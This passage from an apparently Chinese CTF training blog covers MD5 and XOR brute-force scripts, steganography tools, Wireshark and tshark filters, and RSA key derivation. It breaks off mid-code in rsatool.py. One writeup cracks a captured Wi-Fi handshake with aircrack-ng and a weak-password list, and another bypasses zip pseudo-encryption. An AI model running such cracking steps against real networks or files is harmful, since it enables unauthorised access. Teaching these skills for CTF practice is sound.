<li><p>解密：<a href="https://www.cmd5.com/" rel="external nofollow" target="_blank">https://www.cmd5.com/</a></p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080510.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>题目1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(?)[:6] == &apos;233333&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000000</span>):</span><br><span class="line">	m = hashlib.md5()</span><br><span class="line">	m.update(str(i).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">	res = m.hexdigest()</span><br><span class="line">	<span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'233333'</span>:</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>题目2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知一段由5个大写字母组成的明文字符串，经过md5加密后的密文前6位为73acd9,求加密前的明文</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letter:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">                    cipher = i+j+k+l+n</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(cipher)</span><br><span class="line">                    res = m.hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'73acd9'</span>:</span><br><span class="line">                        <span class="keyword">print</span> res</span><br><span class="line">                        <span class="keyword">print</span> cipher</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><ul>
<li><p>相同为0，不同为1</p>
</li>
<li><p>题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文 : FR8SFAgwJzUWASwLHAEsAA4=</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python  </span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ming = <span class="string">'FR8SFAgwJzUWASwLHAEsAA4='</span></span><br><span class="line">mi=base64.b64decode(ming)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">	flag=<span class="string">''</span>  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(mi)):</span><br><span class="line">		t=ord(mi[i])^j</span><br><span class="line">		flag+=chr(t)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag :</span><br><span class="line">		<span class="keyword">print</span> flag</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><hr>
<p>图片隐写主要考察信息在图片中隐写的几种方法，文件头信息修改，stegsolve工具使用，LSB算法，binwalk工具使用等知识。</p>
<h4 id="常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）"><a href="#常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）" class="headerlink" title="常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/）"></a>常用工具介绍（常用工具下载地址：<a href="https://www.ctftools.com/down/）" rel="external nofollow" target="_blank">https://www.ctftools.com/down/）</a></h4><ul>
<li><p>binwalk：是一个固件分析工具，多用于逆向工程、取证、隐写分析</p>
</li>
<li><p>winhex：是在Windows下执行的十六进制编辑软件，此软件功能强大，有完好的分区管理功能和文件管理功能，在CTF中一般用来查看文件头格式、修改16进制数据等。</p>
</li>
<li><p>Stegsolve：是一款图片分析工具，功能十分强大</p>
</li>
<li><p>Stegdetect：是一种数字图像隐写分析工具，主要实现JPEG图像的隐秘信息的嵌入的检测</p>
</li>
<li><p>foremost：和binwalk结合使用，提取隐藏信息。</p>
</li>
<li><p>MP3stego：音频隐写工具 （链接：<a href="https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg</a><br>提取码：0r3r ）<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<ul>
<li><p>用法：隐藏信息  encode -E hidden_text.txt -P pass svega.wav stego.mp3</p>
<p>提取信息 decode -X -P pass svega_stego.mp3</p>
</li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" rel="external nofollow" target="_blank">常见文件文件头格式</a></p>
</li>
<li><p>题目</p>
<ol>
<li><p>查看属性 meinv.jpg  （易）</p>
</li>
<li><p>查看图片内容   hacker.jpg   （易）</p>
</li>
<li><p>binwalk + mp3stego   3.jpg  （中）</p>
</li>
<li><p>binwalk + 伪加密 carefully.jpg （中）  （ps：伪加密是在未加密的zip文件基础上修改了它的压缩源文件目录区里的全局方式位标记的比特值，使得压缩软件打开它的时候识别为加密文件，提示输入密码， 而在这个时候，不管你用什么软件对其进行密码破解，都无法打开它） </p>
<p>伪加密（<a href="https://blog.csdn.net/qq_26187985/article/details/83654197）" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_26187985/article/details/83654197）</a></p>
<p>将如图位置的09改为00即可，或者使用工具ZipCenOp.jar (用法 java -jar ZipCenOp.jar r xxx.zip)</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080507.png" alt=""></p>
</li>
<li><p>gif帧   flag.png.gif    (易)</p>
</li>
<li><p>压缩包爆破   love.zip   （中）</p>
</li>
<li><p>LSB隐写 tanwanlanyue   （中）</p>
</li>
<li><p>其他  f1ag.png   (中)</p>
</li>
<li><p>png改高度    dabai.png   (中) </p>
<p>ps:png文件格式简介：</p>
<p>89 50 4E 47 是文件的格式</p>
<p>00 00 00 0D说明IHDR头块长为13</p>
<p>49 48 44 52 IHDR标识</p>
<p>00 00 01 F4  图像的宽</p>
<p>00 00 01 A4 图像的高</p>
</li>
</ol>
</li>
</ul>
<h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><hr>
<p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br>    LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。</p>
<h2 id="day02–7iny"><a href="#day02–7iny" class="headerlink" title="day02–7iny"></a>day02–7iny</h2><h3 id="内容简介："><a href="#内容简介：" class="headerlink" title="内容简介："></a>内容简介：</h3><p>day02以流量分析，加密解密为主。例题<code>day02.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" rel="external nofollow" target="_blank">链接</a> 提取码: fjru</p>
<h3 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h3><p>Wireshark是目前全球使用最广泛的开源抓包软件（前身为Etherea1），是一个通用化的网络数据嗅探器和协议分析器，由Gerald Combs编写并于1998年以GPL开源许可证发布。</p>
<h3 id="推荐资料："><a href="#推荐资料：" class="headerlink" title="推荐资料："></a>推荐资料：</h3><p>《Wireshark数据包分析实战》第二版Chris Sanders<br>《Wireshark网络分析》第二版Laura Chappe11<br>《TCP/IP协议栈详解卷一》W.Richard Stevens</p>
<h3 id="相关站点："><a href="#相关站点：" class="headerlink" title="相关站点："></a>相关站点：</h3><p>官网下载<a href="https://www.wireshark.org/#download" rel="external nofollow" target="_blank">地址</a></p>
<p>官方<a href="https://wiki.wireshark.org/" rel="external nofollow" target="_blank">wiki页面</a></p>
<h3 id="流量分析："><a href="#流量分析：" class="headerlink" title="流量分析："></a>流量分析：</h3><p><strong>流量分析有以下三个方向：</strong><br>1、流量包修复<br>2、协议分析<br>3、数据提取<br><strong>转载</strong>来自<code>Yokeen总结</code></p>
<h4 id="1、流量包修复"><a href="#1、流量包修复" class="headerlink" title="1、流量包修复"></a>1、流量包修复</h4><p>通常都借助现成的工具例如PCAPFIX直接修复</p>
<ul>
<li><p><a href="https://f00l.de/hacking/pcapfix.php" rel="external nofollow" target="_blank">在线PCAPFIX</a></p>
</li>
<li><p>PCAPFIX<a href="https://github.com/Rup0rt/pcapfix/tree/devel" rel="external nofollow" target="_blank">下载</a><br>流量包常见的块，详细介绍可以看：<a href="http://www.tcpdump.org/pcap/pcap.html" rel="external nofollow" target="_blank">http://www.tcpdump.org/pcap/pcap.html</a></p>
</li>
</ul>
<h4 id="2、协议分析"><a href="#2、协议分析" class="headerlink" title="2、协议分析"></a>2、协议分析</h4><p>须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。<br><code>捕捉过滤器</code>：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。<br><code>显示过滤器</code>：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改<br>捕捉过滤器基础语法<br>Protocol Direction Host(s) Value LogicalOperations other expression<br>tcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 3128</p>
<p>Protocol<br>可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。<br>Direction<br>可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br>Host(s)<br>可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。<br>Logical Operations<br>可能的值：not, and, or<br>否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级<br>“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。</p>
<p>举例分析：<br>tcp dst port 3128 //目的TCP端口为3128的封包。<br>ip src host 10.1.1.1 //来源IP地址为10.1.1.1的封包。<br>host 10.1.2.3 //目的或来源IP地址为10.1.2.3的封包。<br>src portrange 2000-2500<br>//来源为UDP或TCP，并且端口号在2000至2500范围内的封包<br>not icmp //除了icmp以外的所有封包。</p>
<p>显示过滤器基础语法<br>Protocol String1 String2 ComparisonOperator Value Logical Operations other expression<br>Protocol<br>可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSH<br>String1，String2<br>可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类<br>Comparison Oerators<br>可以使用六种比较运算符<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>eq|==|等于|<br>ne|!=|不等于|<br>gt|&gt;|大于|<br>It|&lt;|小于|<br>ge|&gt;=|大于等于|<br>le|&lt;=|小于等于|</p>
<p>Logical Expressions<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>and|&amp;&amp;|逻辑与<br>or| <code>||</code>|逻辑或<br>xor| <code>^^</code>|逻辑异或<br>not| !|逻辑非</p>
<p>举例分析：<br>snmp || dns || icmp //显示SNMP或DNS或ICMP封包<br>ip.addr == 10.1.1.1 //显示源或目的IP为10.1.1.1的封包<br>ip.src != 10.1.2.3 and ip.dst!=10.4.5.6 //显示源不为10.1.2.3并且目的不为10.4.5.6的封包<br>tcp.port == 25 //显示来源或目的TCP端口号为25的封包<br>tcp.dport == 25 //显示目的TCP端口号为25的封包</p>
<p>如果过滤器语法是正确的，表达式背景为<code>绿色</code>，否则为<code>红色</code><br>前文中的wireshark文件还原就可以说是一个很基础的数据包流量分析。</p>
<h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。</p>
<p>可以学习一下tshark的使用<br>tshark作为wireshark的命令行版，高效快捷是它的优点，配合其余命令行工具(awk,grep)等灵活使用，可以快速定位，提取数据从而省去了繁杂的脚本编写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用方法：tshark -r *.pcap -Y ** -T fields -e **|***&gt;data</span><br></pre></td></tr></table></figure>
<h4 id="题目1、MISC-rar"><a href="#题目1、MISC-rar" class="headerlink" title="题目1、MISC.rar"></a>题目1、MISC.rar</h4><blockquote>
<p>key为文本格式，你找得到吗？</p>
</blockquote>
<p>用wireshark打开数据包，在文件 -&gt; 导出对象中，选择HTTP-&gt;保存txt文件</p>
<h4 id="题目2、A记录（蓝鲸）"><a href="#题目2、A记录（蓝鲸）" class="headerlink" title="题目2、A记录（蓝鲸）"></a>题目2、A记录（蓝鲸）</h4><blockquote>
<p>他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是</p>
</blockquote>
<p>ps:在数据包分析工具中，看到的都是加密后的802.11协议的数据包，而无法看到数据包的原始内容。为了方便分析，aircrack-ng工具包提供了一个专用解密工具airdecap-ng。<strong>kali自带</strong></p>
<p>1.aircrack-ng shipin.cap -w password.txt<br>2.airdecap-ng shipin.cap -e 0719 -p 88888888<br>3.top1000弱口令<a href="https://www.yesck.com/down/TOP1000password.txt" rel="external nofollow" target="_blank">下载</a></p>
<h4 id="题目3、好多苍蝇【蓝鲸】"><a href="#题目3、好多苍蝇【蓝鲸】" class="headerlink" title="题目3、好多苍蝇【蓝鲸】"></a>题目3、好多苍蝇【蓝鲸】</h4><blockquote>
<p>好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？</p>
</blockquote>
<ul>
<li>738数据包，导出application/octet-stream的数据流，删除(00000160,B)之前的都是不需要的数据，拼接数据。伪加密，foremost分离。<br>Tools：<br>hxD:<a href="https://mh-nexus.de/en/downloads.php?product=HxD20" rel="external nofollow" target="_blank">下载</a><br>类似软件，了解不推荐<br>winhex:<a href="http://www.x-ways.net/winhex/" rel="external nofollow" target="_blank">下载</a><br>Notepad++ 16进制编辑功能:<a href="https://sourceforge.net/projects/npp-plugins/files/Hex%20Editor/" rel="external nofollow" target="_blank">下载UNI</a><br>解压缩后把HexEditor.dll文件复制到安装目录（如Notepad++\plugins），退出需要以十六进制显示时，点击菜单的：【插件】－【Hex-Editor】－【View in Hex】即可。</li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章:"></a>参考文章:</h3><p>1.某大佬给新疆电网培训<a href="[https://www.addon.pub/2018/04/10/CTF%E4%B8%AD%E7%9A%84%E6%9D%82%E9%A1%B9%E5%B0%8F%E7%BB%93/](https://www.addon.pub/2018/04/10/CTF中的杂项小结/">MISC总结</a>)</p>
<p>2.流量分析–<a href="https://skysec.top/2018/04/21/流量分析-CTF题目实战" rel="external nofollow" target="_blank">ctf实战</a></p>
<p>3.流量分析–<a href="https://xz.aliyun.com/t/1960" rel="external nofollow" target="_blank">HTTP认识</a></p>
<p>4.蓝鲸安全CTF打卡第一期杂项篇<a href="https://www.jianshu.com/p/84a65b64c742" rel="external nofollow" target="_blank">WriteUp</a></p>
<p>5.蓝鲸安全30day打卡<a href="http://codeqi.top/2018/02/06/30-Days/" rel="external nofollow" target="_blank">Writeup</a></p>
<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h4><p>从0到1，<a href="http://since1994.cn/?p=164" rel="external nofollow" target="_blank">基础知识</a></p>
<h4 id="RSA出题"><a href="#RSA出题" class="headerlink" title="RSA出题"></a>RSA出题</h4><p>参考<a href="https://0verwatch.top/RSA-SimpleLearn.html" rel="external nofollow" target="_blank">博客</a></p>
<h4 id="题目1：密钥生成"><a href="#题目1：密钥生成" class="headerlink" title="题目1：密钥生成"></a>题目1：密钥生成</h4><blockquote>
<p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{xxxx}</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080619.jpg" alt=""></p>
<ul>
<li><p>已知p q e 解d <a href="http://since1994.cn/?p=166" rel="external nofollow" target="_blank">详细讲解</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ed ≡ 1 (mod r)</span><br><span class="line">r = (p-1)(q-1) = 2135733082216268400</span><br><span class="line">ed mod r = 1 mod r</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">r=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>-r*i)%e == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'d:'</span> + <span class="string">'%d'</span> % ((<span class="number">1</span>-r*i)/e))</span><br></pre></td></tr></table></figure>
<p>使用rsatool.py进行计算，环境kali,python2.X</p>
<blockquote>
<p>sudo apt-get install libgmp-dev</p>
<p>pip install gmpy</p>
</blockquote>
<p>python2 rsatool.py -p 473398607161 -q 4511491 -e 17</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> base64, fractions, optparse, random</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1.type.univ <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">PEM_TEMPLATE = <span class="string">'-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n'</span></span><br><span class="line">DEFAULT_EXP = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span><span class="params">(n, d, e)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        quotient, remainder = divmod(t, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"> </span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = pow(a, pow(<span class="number">2</span>, i<span class="number">-1</span>, n) * t, n)</span><br><span class="line">            c2 = pow(a, pow(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"> </span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (<span class="number">-1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    p = fractions.gcd(c1<span class="number">-1</span>, n)</span><br><span class="line">    q = (n / p)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Initialize RSA instance using primes (p, q)</span></span><br><span class="line"><span class="string">        or modulus and private exponent (n, d)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"> </span><br><span class="line">        self.e = e</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">and</span> q:</span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(p), <span class="string">'p is not prime'</span></span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(q), <span class="string">'q is not prime'</span></span><br><span class="line"> </span><br><span class="line">            self.p = p</span><br><span class="line">            self.q = q</span><br><span class="line">        <span class="keyword">elif</span> n <span class="keyword">and</span> d:   </span><br><span class="line">            self.p, self.q = factor_modulus(n, d, e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ArgumentError(<span class="string">'Either (p, q) or (n, d) must be provided'</span>)</span><br><span class="line"> </span><br><span class="line">        self._calc_values()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_calc_values</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line"> </span><br><span class="line">        phi = (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>)</span><br><span class="line">        self.d = gmpy.invert(self.e, phi)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># CRT-RSA precomputation</span></span><br><span class="line">        self.dP = self.d % (self.p - <span class="number">1</span>)</span><br><span class="line">        self.dQ = self.d % (self.q - <span class="number">1</span>)</span><br><span class="line">        self.qInv = gmpy.invert(self.q, self.p)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_pem</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return OpenSSL-compatible PEM encoded key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> PEM_TEMPLATE % base64.encodestring(self.to_der())</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_der</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return parameters as OpenSSL compatible DER encoded key</span></span><br><span class="line"><span class="string">        